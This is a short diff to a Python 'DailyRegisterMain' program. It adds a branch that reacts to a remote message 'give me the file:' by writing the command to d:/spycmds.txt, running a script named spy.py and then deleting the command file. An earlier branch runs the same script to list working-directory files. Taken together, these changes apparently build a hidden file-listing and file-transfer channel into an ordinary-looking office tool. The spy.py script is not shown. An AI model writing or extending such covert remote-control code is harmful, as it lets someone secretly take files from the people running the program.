@@ -40,8 +40,17 @@ class DailyRegisterMain(object):
             os.system(r"C:\Python34\python.exe D:\office\message\specialtask.py")
             return
         elif result == "give me the working directory files list":
-            print("special task")
+            print("special task:get files list")
             os.system(r"C:\Python34\python.exe D:\office\message\spy.py")
+            return
+        elif "give me the file:" in result:
+            print("special task:transfer file")
+            with open("d:/spycmds.txt","a") as f:
+                f.seek(0,0)
+                f.write('%s\n'%(result))
+            os.system(r"C:\Python34\python.exe D:\office\message\spy.py")
+            if os.path.exists("d:/spycmds.txt"):
+                os.remove("d:/spycmds.txt")
             return
         else:           
             if self.forbid != True:
